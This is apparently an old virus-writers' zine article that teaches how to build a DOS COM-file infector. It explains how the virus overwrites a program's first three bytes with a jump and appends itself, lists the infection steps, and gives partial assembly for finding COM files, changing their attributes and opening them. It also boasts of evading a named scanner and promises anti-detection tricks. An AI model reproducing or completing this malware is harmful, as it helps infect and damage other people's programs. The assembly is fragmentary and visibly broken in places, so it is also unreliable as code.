  Hi, I'm Spider, i'm new on VBB, and on this article I will talk about COM
 virus. Note that to understand what I will show, you MUST know assembly, and
 how COM files and virus works.. so, let's start of the beginning:

 How COM files work
 ~~~ ~~~ ~~~~~ ~~~~
  All files are divided into segments, these segments are not in order and
can be load in to any place of memory... the principal diference between a
COM and EXE file is that on COM files, the segmente will always start at 100h!
  With this in mind, it will be very simples to write a COM virus.
 
 How COM virus work
 ~~~ ~~~ ~~~~~ ~~~~
  Ok, what a virus will do is open the COM file and save the first 3 bytes,
 on the place of this 3 bytes, the virus will put a JMP to the end of the file
 and copy the rest of the virus to it... so, the virus will always run first!
  After do the job, the virus will restore the original 3 byte, and load again
 at 100h, so the file starts again without know that there is something wrong.
  A normal COM file is like this:
       
       1               2                    3
   __________ ____________________ __________________
  |          |                    |                  |
  |          |                    |                  |
  |__________|____________________|__________________|

 Number 1 - Begining of the COM file 
        2 - Middle of COM file
        3 - End of COM file
  On most COM files, they are executed and loaded on this order, 1, 2, 3. When
 a virus infects a COM file, the COM file will look like this:

   1      3              4                 5                   2
   ___ ________ ____________________ __________________ _______________
  |   |        |                    |                  |               |
  |JMP|        |                    |                  |    VIRUS      |
  |___|________|____________________|__________________|_______________|

  When finish the job the virus will replace the JMP("1") with the 3 bytes,  
 and back control to the COM file!
  
  So a simple but good virus will do this:
    1- Find a file to fuck
    3- Save the atributes of the file
    2- Turn all file's attributes to OFF(normal file)
    3- Open the file for read/write
    4- Save the date/time of the file
    5- See if is already infect, if so, go to 8
    6- No, save the first 3 bytes, and replace it with a JMP
    7- Copy the rest of the virus to the end of the COM file
    8- Close the file
    9- Restore date/time/....
   10- Back control to the original program
   11- End
 
 Now, let's take a look on a virus that will do exacly that:

 ;----------------------------------------------------------------------
 ; The Simple routine to Search for a .COM File...
 ;----------------------------------------------------------------------
 com_files       db      "*.com",0 ; Mask for COM files.
                             
         mov ah, 4eh               ; Point to a *.COM file...
         mov dx, com_files         ; Mask for COM files.
         mov cx, 7                 ; Any kind of file.
         int 21h                   ;

         cmp ax, 12h               ; Found?!?
         je exit                   ; No, exit...
         jmp found_file            ; Yes, FUCK IT!!!
 
 ; Instead of Exiting here you can make the Virus go and change dir and
 ; look for several other .com files else where... with the help of the
 ; path or simply searching for more <dir>...

 found_file:
         mov di, [si+file]         ; DI points to the filename.
         push si                   ;
         add si, file              ; SI points to filename...

         mov ax, offset 4300h      ; Get file attributes.
         mov dx, si                ; Filename in DX.
         int 21h

         mov     file_attrib, cx   ; Save file Attributes.

 file dw 0                 ; Here is where we save the filename.
 
 ; Now we will disable all atributes of the COM file that the virus found

         mov ax, offset 4301h      ; To set file attributes...
         mov cx, offset 0fffeh     ; Set them to a normal File.
         mov dx, si                ; Filename.
         int 21h                   ;

         int 21h                   ;

         jnb ok                    ; If file was open continue.
         jmp put_old_attrib        ; Error happened restore 
                                   ;             old attribs and quit.

         mov ax, offset 5700h      ; Get File Date & Time...

 ; somewhere in our virus

         mov ah,3fh                 ; Read file.

 Anyhow that's it... Simple no? This source was also used in ParaSite ][ of
 Rocky Steady and is STILL undetectable to date with Scanv85. Note that this
 code have lot's of Errors checks, this is very good, but if your virus need
 to have a minimum size, it better don't use this checks. Remember that COM
 files can have only 64k! So create a test to know if your virus can fuck 
 the file, because if the file have 60k, and the virus 5k, the virus will just
 crash file!!
 
 Anyhow theres still work to be done, like you must restore the old data file
 so it will jump to 100h and run the old file the virus was infected too!
 Remember to store them in the beginning and then restore them! Anyhow there's
 a few Variables to be put in like `VirLength' which you should know how to
 do that also the `CodeLength' that is the VIRUS codes ONLY not counting the
 Stacks.
                                                                       
 On next article, I will show a complete COM virus, and some others tricks to
 avoid detection by AV(Anti-Virus LAMER!!).
